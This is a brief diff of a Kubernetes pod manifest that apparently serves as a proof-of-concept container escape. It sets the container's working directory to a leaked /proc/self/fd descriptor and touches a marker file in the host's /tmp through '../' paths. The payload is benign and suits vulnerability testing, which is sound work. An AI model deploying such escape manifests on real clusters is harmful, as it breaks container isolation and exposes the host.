@@ -8,6 +8,6 @@ spec:
   containers:
   - name: ubuntu
     image: ubuntu:latest
-    workingDir: /proc/self/fd/8
+    workingDir: /proc/self/fd/7
     command: [ "/bin/bash", "-c", "--" ]
     args: [ "touch ../../../../../../tmp/container-escape-cve202421616.txt; while true; do sleep 60; done;" ]
